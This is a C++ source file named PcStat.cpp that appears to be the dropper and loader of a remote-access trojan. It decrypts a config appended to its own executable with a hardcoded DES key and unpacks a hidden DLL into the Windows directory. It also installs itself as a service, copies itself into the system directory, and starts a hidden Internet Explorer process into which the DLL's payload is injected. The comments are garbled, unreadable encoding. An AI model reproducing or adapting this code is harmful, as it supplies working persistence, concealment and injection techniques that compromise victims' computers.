// PcStat.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "PcStat.h"
#include <process.h>
#include <Tlhelp32.h>
#include "Lzw.h"
#include "WjcDes.h"

#include   "Windows.h"   
#include   "Winsvc.h" 
#include   "stdio.h" 
#include   "time.h"
#include   "stdlib.h"  

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif


/////////////////////////////////////////////////////////////////////////////
// CPcStatApp

BEGIN_MESSAGE_MAP(CPcStatApp, CWinApp)
	//{{AFX_MSG_MAP(CPcStatApp)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG
	ON_COMMAND(ID_HELP, CWinApp::OnHelp)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPcStatApp construction

CPcStatApp::CPcStatApp()
{
	memset(&m_Info, 0, sizeof(m_Info));
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CPcStatApp object

CPcStatApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CPcStatApp initialization

#ifdef _DEBUG
void WriteLog(char* pText)
{
	FILE *fp = fopen("c:\\1.txt","a+");
	if(fp != NULL)
	{
		strcat(pText, "\n");
		fwrite(pText, strlen(pText), 1, fp);
		fclose(fp);
	}
}
#endif

BOOL CALLBACK EnumWindowsProc(HWND hwnd , LPARAM lParam)
{
	DWORD m_Id = 0;
	GetWindowThreadProcessId(hwnd,&m_Id);
	if(m_Id == (DWORD) lParam)
	{
		PostMessage(hwnd,WM_NULL,0,0);
		PostMessage(hwnd,WM_NULL,0,0);
		return FALSE;
	}
	return TRUE;
}

void CPcStatApp::InsertDllToProcess(HMODULE m_Module)
{
	// ȡ��������
	PLAYWORK PlayWork = (PLAYWORK) GetProcAddress(m_Module,"PlayWork");
	if(PlayWork == NULL) return ;

	if(m_Info.m_ProcessName[0] == 0)
	{
		// ���뵽explorer.exe����(�״�����������⣬��Ϊ����explorer.exe��û����)
		//if(!CheckProcess(m_Info.m_ProcessId)) 
		//{
		//	CloseHandle(m_ExitEvent);
		//	return ;
		//}
	}
	else if(m_Info.m_ProcessName[0] == 1)
	{
		// ���뵽������ie
		PROCESS_INFORMATION piProcInfo;
		STARTUPINFO siStartInfo;  

		// Set up members of STARTUPINFO structure.  
		ZeroMemory( &siStartInfo, sizeof(STARTUPINFO));
		GetStartupInfo(&siStartInfo);
		siStartInfo.cb = sizeof(STARTUPINFO);  
		siStartInfo.wShowWindow = SW_HIDE;
		siStartInfo.dwFlags = STARTF_USESHOWWINDOW;

		char m_IePath[256] = "C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE";
		char m_SysPath[256] = {0};
		GetSystemDirectory(m_SysPath,200);
		m_IePath[0] = m_SysPath[0];
		if(!CreateProcess( m_IePath, NULL, NULL, NULL, TRUE,  
			DETACHED_PROCESS, NULL, NULL, &siStartInfo, &piProcInfo))
		{
			CloseHandle(m_ExitEvent);
			return;
		}

		// �ȴ����̳�ʼ��
		m_Info.m_ProcessId = (UINT) piProcInfo.dwProcessId ;
		WaitForInputIdle(piProcInfo.hProcess,3000);
	}	
	else
	{
		// ����������
		PlayWork(&m_Info);
		WaitForSingleObject(m_ExitEvent,INFINITE);
		CloseHandle(m_ExitEvent);
		return;
	}
   
	// ����ָ������
	if(PlayWork(&m_Info))
	{
		EnumWindows(EnumWindowsProc,m_Info.m_ProcessId);
		WaitForSingleObject(m_ExitEvent,INFINITE);
	}

	// �رյȴ��¼����
	CloseHandle(m_ExitEvent);
}

BOOL CPcStatApp::LoadInitInfo()
{
	// ȡ��ǰEXE�ļ�����
	char m_ExeFileName[256] = {0};
	GetModuleFileName(NULL,m_ExeFileName,200);// ���ظ�Ӧ�ó���ȫ·��
	
	// ���ļ�����
	INITDLLINFO m_TmpFileInfo = {0}, m_FileInfo = {0};
	FILE* fp = fopen(m_ExeFileName, "rb"); // �򿪱��ػ���Զ�˵��ļ�(rb)'b' ������ϵͳ�����ּ�����λ�ļ���ͬ��'r' ���ļ���ʽΪֻ����
	if(fp == NULL) return FALSE;
	if(fseek(fp , 0 - sizeof(INITDLLINFO) , SEEK_END)) // �ض�λ���ϵ��ļ�ָ�� SEEK_CUR�� ��ǰλ�� ,SEEK_END�� �ļ���β, SEEK_SET�� �ļ���ͷ
	{
		fclose(fp);
		return FALSE;
	}

	// ����ʼ������
	fread(&m_TmpFileInfo , sizeof(INITDLLINFO) , 1, fp);
	fclose(fp);

	// ��������
	char m_DesKey[9] = "\x10\x20\x17\x10\x09\x55\x11\xeb";
	Des_Go((char*) &m_FileInfo, (char*) &m_TmpFileInfo, 
		sizeof(INITDLLINFO), m_DesKey, 8, DECRYPT); // ����
	memcpy(&m_Info, &m_FileInfo, sizeof(INITDLLINFO));

	strcpy(m_Info.m_ParentFile, m_ExeFileName);
	// strcpy(m_Info.m_EventName, AfxGetAppName());
	strcpy(m_Info.m_EventName, "Ps");

	if(m_Info.m_IsUpdate == 0)
	{
		// �����ļ�
		GetWindowsDirectory(m_Info.m_StartFile, 200); // ��ȡWindowsĿ¼������·����
		strcat(m_Info.m_StartFile, "\\"); // ��src��ָ�ַ�����ӵ�dest��β��
		strcat(m_Info.m_StartFile , m_FileInfo.m_StartFile);
	
		// �����ļ�
		GetWindowsDirectory(m_Info.m_CtrlFile, 200);
		strcat(m_Info.m_CtrlFile, "\\");
		strcat(m_Info.m_CtrlFile, m_FileInfo.m_CtrlFile);
	}

	// ���m_Info.nowExeFile(ϵͳĿ¼)
	char* pFind = strrchr(m_Info.m_ParentFile,'\\');
	if(pFind == NULL) return FALSE;
	
	char m_SystemPath[MAX_PATH] = {0};
	GetSystemDirectory(m_SystemPath, MAX_PATH);
	sprintf(m_Info.m_nowExefile, "%s%s", m_SystemPath, pFind);

	return TRUE;
}

BOOL CPcStatApp::CheckProcess(UINT &pId)
{
	HANDLE m_Sys = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if(m_Sys == NULL) return FALSE;

	PROCESSENTRY32 m_Lppe = {0};
	char m_ExeName[512] = {0};
	char m_Name[256] = "EXPLORER.EXE";

	m_Lppe.dwSize = sizeof(PROCESSENTRY32);
	if(!Process32First(m_Sys,&m_Lppe))
	{
		CloseHandle(m_Sys);
		return FALSE;
	}

	memset(m_ExeName,0,sizeof(m_ExeName));
	strcpy(m_ExeName,m_Lppe.szExeFile);
	_strupr(m_ExeName);

	if(strstr(m_ExeName,m_Name))
	{	
		pId = m_Lppe.th32ProcessID;
		CloseHandle(m_Sys);
		return TRUE;
	}

	while(Process32Next(m_Sys,&m_Lppe))
	{
		memset(m_ExeName,0,sizeof(m_ExeName));
		strcpy(m_ExeName,m_Lppe.szExeFile);
		_strupr(m_ExeName);
		if(strstr(m_ExeName,m_Name))
		{	
			pId = m_Lppe.th32ProcessID;
			CloseHandle(m_Sys);
			return TRUE;
		}
	}
	CloseHandle(m_Sys);
	return FALSE;
}

BOOL CPcStatApp::DeCodeFile(char* pFileData , 
							char* pFileName , 
							DWORD FileLen)
{
	// ���ļ�
	FILE *fp = fopen(pFileName,"wb");
	if(fp == NULL) return FALSE;
	// ����
	BYTE* pDest = new BYTE[FileLen + 1024];
	FCLzw lzw ;
	lzw.LZW_Decode ((BYTE*) pFileData, pDest) ;
	
	// д�ļ�
	fwrite(pDest , FileLen , 1 , fp);
	fclose(fp);
	delete [] pDest;
	return TRUE;
}

BOOL CPcStatApp::GetInsertDllFile()
{
	// ȡ��ǰEXE�ļ�����
	char exeFileName[MAX_PATH] = {0};
	GetModuleFileName(NULL, exeFileName, MAX_PATH);

	// ��ִ���ļ�
	FILE* fp = fopen(exeFileName, "rb");
	if(fp == NULL) return FALSE;

	// �ƶ�Ŀ��	
	if(fseek(fp , 0 - (m_Info.m_DllFileLen + sizeof(INITDLLINFO)) , SEEK_END))
	{
		fclose(fp);
		return FALSE;
	}
	
	// ������DLL�ļ�����
	char *m_FileBuf = new char[m_Info.m_DllFileLen];
	fread(m_FileBuf,m_Info.m_DllFileLen,1,fp);
	int s=5;
	fclose(fp);

	// �Ѿ����¹��ĳ���
	if(m_Info.m_IsUpdate == 1)
	{
		fp = fopen(m_Info.m_StartFile,"wb");
		if(fp == NULL)
		{
			delete [] m_FileBuf;
			return FALSE;
		}
		fwrite(m_FileBuf, m_Info.m_DllFileLen, 1, fp);
		fclose(fp);
		delete [] m_FileBuf;
		return TRUE;
	}

	// �鿴������Ч��
	DWORD DesFileLen = *((DWORD*) &m_FileBuf[12]);
	if(memcmp(m_FileBuf , "SSH" , 3) ||	
		DesFileLen > 512 * 1024)
	{
		delete [] m_FileBuf;
		return FALSE;
	}

	// ��ѹ�ļ�
	if(!DeCodeFile(m_FileBuf + 26 + (* (WORD *) 
		&m_FileBuf[24]), m_Info.m_StartFile , DesFileLen))
	{
		delete [] m_FileBuf;
		return FALSE;
	}

	delete [] m_FileBuf;
	return TRUE;
}

BOOL CPcStatApp::InitInstance()
{
	// ����Event�¼���ȫ����(����������OpenEvent������̵�Event)
	SECURITY_DESCRIPTOR secutityDese;
	::InitializeSecurityDescriptor(&secutityDese, SECURITY_DESCRIPTOR_REVISION);
	::SetSecurityDescriptorDacl(&secutityDese,TRUE,NULL,FALSE);
	SECURITY_ATTRIBUTES securityAttr;
	securityAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	securityAttr.bInheritHandle = FALSE;
	securityAttr.lpSecurityDescriptor = &secutityDese;
	strcpy(m_Info.m_EventName, AfxGetAppName());
	// ���������¼�
	m_ExitEvent = CreateEvent(&securityAttr, TRUE, FALSE, "Ps");
	if(m_ExitEvent == NULL || GetLastError() == ERROR_ALREADY_EXISTS) 
		return FALSE;

	// ����INITDLLINFO����(�ӱ�exe�ļ���)
	if(!LoadInitInfo()) 
		return FALSE;

	// ע�����
	m_ServiceManager.SetThreadId(GetCurrentThreadId());
	m_ServiceManager.SetServiceName(m_Info.m_serviceName);
	m_ServiceManager.SetServiceFilePath(m_Info.m_nowExefile);
	
	SERVICE_TABLE_ENTRY st[] =
    {
        {m_Info.m_serviceName, (LPSERVICE_MAIN_FUNCTION)ServiceManager::_ServiceMain},
        {NULL, NULL}
    };
	// �������ʾ��SCMִ��
	if (::StartServiceCtrlDispatcher(st))
	{
		return TRUE;
	}
	else
	{
		GotoWork(); // ֻ���ֶ����б�����ſ���ִ�е�
	}

	return TRUE;
}

void CPcStatApp::GotoWork()
{
	// ��װϵͳ����(����Ѿ���װ����ֱ�ӷ���)
	m_ServiceManager.InstallService(); 

	// ����Dll�ļ�
	if (!GetInsertDllFile()) 
		return;
	
	// ���Ʊ�����ϵͳĿ¼��
	CopyFile(m_Info.m_ParentFile, m_Info.m_nowExefile, FALSE);
	
	//װ������dll
	HMODULE m_Module = LoadLibrary(m_Info.m_StartFile);
	if (m_Module == NULL) 
		return;
	
	//ע��dll��������������
	InsertDllToProcess(m_Module);
	
	//�ͷ���Դ
	FreeLibrary(m_Module);
}